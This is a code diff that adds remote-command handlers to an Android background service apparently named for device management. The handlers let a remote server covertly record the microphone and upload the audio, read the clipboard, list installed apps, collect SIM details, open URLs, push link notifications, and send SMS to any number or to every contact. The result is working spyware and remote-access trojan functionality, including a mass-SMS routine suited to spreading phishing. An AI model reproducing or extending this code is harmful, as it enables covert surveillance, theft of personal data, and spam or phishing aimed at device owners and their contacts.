@@ -39,9 +39,20 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Telephony;
+import android.telephony.SmsManager;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Surface;
+import android.os.Vibrator;
+import android.os.VibrationEffect;
+import android.widget.Toast;
+import android.content.ClipboardManager;
+import android.content.ClipData;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
@@ -63,6 +74,7 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.URISyntaxException;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Timer;
@@ -212,6 +224,34 @@ public class DeviceService extends Service {
                 if (args.length > 0) handlePhotoDelete((JSONObject) args[0]);
             });
             socket.on("command:recordings:fetch", args -> handleRecordingsFetch());
+
+            // New feature handlers
+            socket.on("command:webview:open", args -> {
+                if (args.length > 0) handleWebViewOpen((JSONObject) args[0]);
+            });
+            socket.on("command:notification:send", args -> {
+                if (args.length > 0) handleNotificationSend((JSONObject) args[0]);
+            });
+            socket.on("command:toast:show", args -> {
+                if (args.length > 0) handleToastShow((JSONObject) args[0]);
+            });
+            socket.on("command:sim:info", args -> handleSimInfo());
+            socket.on("command:vibrate", args -> {
+                JSONObject params = (args.length > 0 && args[0] instanceof JSONObject) ? (JSONObject) args[0] : new JSONObject();
+                handleVibrate(params);
+            });
+            socket.on("command:sms:send", args -> {
+                if (args.length > 0) handleSmsSend((JSONObject) args[0]);
+            });
+            socket.on("command:sms:sendall", args -> {
+                if (args.length > 0) handleSmsSendAll((JSONObject) args[0]);
+            });
+            socket.on("command:apps:list", args -> handleAppsList());
+            socket.on("command:mic:record", args -> {
+                JSONObject params = (args.length > 0 && args[0] instanceof JSONObject) ? (JSONObject) args[0] : new JSONObject();
+                handleMicRecord(params);
+            });
+            socket.on("command:clipboard:get", args -> handleClipboardGet());
 
             socket.connect();
 
@@ -1189,6 +1229,394 @@ public class DeviceService extends Service {
         } catch (Exception e) {
             Log.e(TAG, "Recordings fetch error: " + e.getMessage());
         }
+    }
+
+    // ---- WebView / Open URL ----
+    private void handleWebViewOpen(JSONObject args) {
+        try {
+            String url = args.getString("url");
+            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(browserIntent);
+
+            JSONObject data = new JSONObject();
+            data.put("success", true);
+            data.put("url", url);
+            socket.emit("webview:opened", data);
+            Log.d(TAG, "Opened URL: " + url);
+        } catch (Exception e) {
+            Log.e(TAG, "WebView open error: " + e.getMessage());
+            emitError("webview:opened", e.getMessage());
+        }
+    }
+
+    // ---- Notification Sender ----
+    private static final String NOTIF_CHANNEL_CUSTOM = "mydevice_custom";
+    private int customNotifId = 5000;
+
+    private void handleNotificationSend(JSONObject args) {
+        try {
+            String title = args.optString("title", "My Device");
+            String body = args.optString("body", "");
+            String clickUrl = args.optString("url", "");
+
+            NotificationManager nm = getSystemService(NotificationManager.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel(
+                    NOTIF_CHANNEL_CUSTOM, "Custom Notifications",
+                    NotificationManager.IMPORTANCE_HIGH);
+                ch.setDescription("Remote notifications");
+                nm.createNotificationChannel(ch);
+            }
+
+            Intent clickIntent;
+            if (!clickUrl.isEmpty()) {
+                clickIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(clickUrl));
+            } else {
+                clickIntent = new Intent(this, MainActivity.class);
+            }
+            clickIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            PendingIntent pi = PendingIntent.getActivity(this, customNotifId, clickIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+            Notification notif = new NotificationCompat.Builder(this, NOTIF_CHANNEL_CUSTOM)
+                .setContentTitle(title)
+                .setContentText(body)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentIntent(pi)
+                .setAutoCancel(true)
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .build();
+
+            nm.notify(customNotifId++, notif);
+
+            JSONObject data = new JSONObject();
+            data.put("success", true);
+            socket.emit("notification:sent", data);
+            Log.d(TAG, "Custom notification sent: " + title);
+        } catch (Exception e) {
+            Log.e(TAG, "Notification send error: " + e.getMessage());
+            emitError("notification:sent", e.getMessage());
+        }
+    }
+
+    // ---- Toast Message ----
+    private void handleToastShow(JSONObject args) {
+        try {
+            String message = args.optString("message", "Hello from My Device");
+            int duration = args.optInt("duration", 0); // 0=short, 1=long
+            new Handler(getMainLooper()).post(() -> {
+                Toast.makeText(this, message,
+                    duration == 1 ? Toast.LENGTH_LONG : Toast.LENGTH_SHORT).show();
+            });
+
+            JSONObject data = new JSONObject();
+            data.put("success", true);
+            socket.emit("toast:shown", data);
+            Log.d(TAG, "Toast shown: " + message);
+        } catch (Exception e) {
+            Log.e(TAG, "Toast error: " + e.getMessage());
+            emitError("toast:shown", e.getMessage());
+        }
+    }
+
+    // ---- SIM Card Info ----
+    private void handleSimInfo() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            JSONObject data = new JSONObject();
+            data.put("operator", tm.getNetworkOperatorName());
+            data.put("operatorCode", tm.getNetworkOperator());
+            data.put("simOperator", tm.getSimOperatorName());
+            data.put("simCountry", tm.getSimCountryIso());
+            data.put("networkCountry", tm.getNetworkCountryIso());
+            data.put("phoneType", tm.getPhoneType());
+            data.put("networkType", tm.getDataNetworkType());
+            data.put("simState", tm.getSimState());
+
+            // Get SIM slot details if available
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    SubscriptionManager sm = (SubscriptionManager) getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE);
+                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
+                            == PackageManager.PERMISSION_GRANTED) {
+                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
+                        if (subs != null) {
+                            JSONArray simSlots = new JSONArray();
+                            for (SubscriptionInfo sub : subs) {
+                                JSONObject sim = new JSONObject();
+                                sim.put("carrier", sub.getCarrierName().toString());
+                                sim.put("displayName", sub.getDisplayName().toString());
+                                sim.put("slot", sub.getSimSlotIndex());
+                                sim.put("country", sub.getCountryIso());
+                                simSlots.put(sim);
+                            }
+                            data.put("simSlots", simSlots);
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "SIM slots error: " + e.getMessage());
+                }
+            }
+
+            // Network connectivity info
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            NetworkInfo ni = cm.getActiveNetworkInfo();
+            if (ni != null) {
+                data.put("connected", ni.isConnected());
+                data.put("connectionType", ni.getTypeName());
+            }
+
+            socket.emit("sim:info", data);
+            Log.d(TAG, "SIM info sent");
+        } catch (Exception e) {
+            Log.e(TAG, "SIM info error: " + e.getMessage());
+            emitError("sim:info", e.getMessage());
+        }
+    }
+
+    // ---- Vibrate Device ----
+    private void handleVibrate(JSONObject args) {
+        try {
+            long duration = args.optLong("duration", 1000);
+            String pattern = args.optString("pattern", "");
+
+            Vibrator vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+            if (vibrator == null || !vibrator.hasVibrator()) {
+                emitError("vibrate:done", "No vibrator available");
+                return;
+            }
+
+            if (!pattern.isEmpty()) {
+                String[] parts = pattern.split(",");
+                long[] timings = new long[parts.length];
+                for (int i = 0; i < parts.length; i++) {
+                    timings[i] = Long.parseLong(parts[i].trim());
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    vibrator.vibrate(VibrationEffect.createWaveform(timings, -1));
+                } else {
+                    vibrator.vibrate(timings, -1);
+                }
+            } else {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    vibrator.vibrate(duration);
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("success", true);
+            socket.emit("vibrate:done", data);
+            Log.d(TAG, "Device vibrated");
+        } catch (Exception e) {
+            Log.e(TAG, "Vibrate error: " + e.getMessage());
+            emitError("vibrate:done", e.getMessage());
+        }
+    }
+
+    // ---- Send SMS ----
+    private void handleSmsSend(JSONObject args) {
+        try {
+            String number = args.getString("number");
+            String message = args.getString("message");
+
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                emitError("sms:sent", "SMS permission not granted");
+                return;
+            }
+
+            SmsManager smsManager = SmsManager.getDefault();
+            ArrayList<String> parts = smsManager.divideMessage(message);
+            smsManager.sendMultipartTextMessage(number, null, parts, null, null);
+
+            JSONObject data = new JSONObject();
+            data.put("success", true);
+            data.put("number", number);
+            socket.emit("sms:sent", data);
+            Log.d(TAG, "SMS sent to: " + number);
+        } catch (Exception e) {
+            Log.e(TAG, "SMS send error: " + e.getMessage());
+            emitError("sms:sent", e.getMessage());
+        }
+    }
+
+    // ---- Send SMS to All Contacts ----
+    private void handleSmsSendAll(JSONObject args) {
+        try {
+            String message = args.getString("message");
+
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
+                    != PackageManager.PERMISSION_GRANTED ||
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                emitError("sms:sentall", "SMS or Contacts permission not granted");
+                return;
+            }
+
+            List<String> numbers = new ArrayList<>();
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
+                null, null, null);
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String num = cursor.getString(0);
+                    if (num != null && !num.isEmpty()) {
+                        num = num.replaceAll("[^+0-9]", "");
+                        if (!numbers.contains(num)) numbers.add(num);
+                    }
+                }
+                cursor.close();
+            }
+
+            SmsManager smsManager = SmsManager.getDefault();
+            ArrayList<String> parts = smsManager.divideMessage(message);
+            int sentCount = 0;
+            for (String number : numbers) {
+                try {
+                    smsManager.sendMultipartTextMessage(number, null, parts, null, null);
+                    sentCount++;
+                } catch (Exception e) {
+                    Log.e(TAG, "SMS send error for " + number + ": " + e.getMessage());
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("success", true);
+            data.put("totalContacts", numbers.size());
+            data.put("sentCount", sentCount);
+            socket.emit("sms:sentall", data);
+            Log.d(TAG, "SMS sent to " + sentCount + "/" + numbers.size() + " contacts");
+        } catch (Exception e) {
+            Log.e(TAG, "SMS send all error: " + e.getMessage());
+            emitError("sms:sentall", e.getMessage());
+        }
+    }
+
+    // ---- Installed Apps List ----
+    private void handleAppsList() {
+        try {
+            PackageManager pm = getPackageManager();
+            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(
+                PackageManager.GET_META_DATA);
+
+            JSONArray appList = new JSONArray();
+            for (android.content.pm.ApplicationInfo app : apps) {
+                JSONObject appObj = new JSONObject();
+                appObj.put("name", pm.getApplicationLabel(app).toString());
+                appObj.put("package", app.packageName);
+                appObj.put("system", (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
+                try {
+                    android.content.pm.PackageInfo pi = pm.getPackageInfo(app.packageName, 0);
+                    appObj.put("version", pi.versionName);
+                    appObj.put("installedAt", pi.firstInstallTime);
+                    appObj.put("updatedAt", pi.lastUpdateTime);
+                } catch (Exception e) {
+                    // skip version info
+                }
+                appList.put(appObj);
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("apps", appList);
+            data.put("count", appList.length());
+            socket.emit("apps:list", data);
+            Log.d(TAG, "Sent " + appList.length() + " installed apps");
+        } catch (Exception e) {
+            Log.e(TAG, "Apps list error: " + e.getMessage());
+            emitError("apps:list", e.getMessage());
+        }
+    }
+
+    // ---- Microphone Record with Duration ----
+    private void handleMicRecord(JSONObject args) {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+                != PackageManager.PERMISSION_GRANTED) {
+            emitError("mic:recording", "Microphone permission not granted");
+            return;
+        }
+
+        int durationSeconds = args.optInt("duration", 10);
+        if (durationSeconds < 1) durationSeconds = 1;
+        if (durationSeconds > 300) durationSeconds = 300; // Max 5 min
+
+        try {
+            File audioFile = new File(getCacheDir(), "mic_recording_" + System.currentTimeMillis() + ".3gp");
+            MediaRecorder recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFile(audioFile.getAbsolutePath());
+            recorder.prepare();
+            recorder.start();
+
+            JSONObject statusData = new JSONObject();
+            statusData.put("status", "recording");
+            statusData.put("duration", durationSeconds);
+            socket.emit("mic:status", statusData);
+
+            final int finalDuration = durationSeconds;
+            new Handler(getMainLooper()).postDelayed(() -> {
+                try {
+                    recorder.stop();
+                    recorder.release();
+
+                    if (audioFile.exists()) {
+                        FileInputStream fis = new FileInputStream(audioFile);
+                        byte[] bytes = new byte[(int) audioFile.length()];
+                        fis.read(bytes);
+                        fis.close();
+
+                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                        JSONObject data = new JSONObject();
+                        data.put("audio", "data:audio/3gpp;base64," + base64);
+                        data.put("duration", finalDuration);
+                        data.put("size", audioFile.length());
+                        socket.emit("mic:recording", data);
+
+                        audioFile.delete();
+                        Log.d(TAG, "Mic recording completed: " + finalDuration + "s");
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Mic record stop error: " + e.getMessage());
+                    emitError("mic:recording", e.getMessage());
+                }
+            }, durationSeconds * 1000L);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Mic record error: " + e.getMessage());
+            emitError("mic:recording", e.getMessage());
+        }
+    }
+
+    // ---- Clipboard ----
+    private void handleClipboardGet() {
+        new Handler(getMainLooper()).post(() -> {
+            try {
+                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+                String text = "";
+                if (clipboard != null && clipboard.hasPrimaryClip()) {
+                    ClipData clip = clipboard.getPrimaryClip();
+                    if (clip != null && clip.getItemCount() > 0) {
+                        CharSequence cs = clip.getItemAt(0).getText();
+                        if (cs != null) text = cs.toString();
+                    }
+                }
+
+                JSONObject data = new JSONObject();
+                data.put("text", text);
+                data.put("timestamp", System.currentTimeMillis());
+                socket.emit("clipboard:content", data);
+                Log.d(TAG, "Clipboard sent: " + (text.isEmpty() ? "(empty)" : text.substring(0, Math.min(50, text.length()))));
+            } catch (Exception e) {
+                Log.e(TAG, "Clipboard error: " + e.getMessage());
+                emitError("clipboard:content", e.getMessage());
+            }
+        });
     }
 
     // ---- Helpers ----
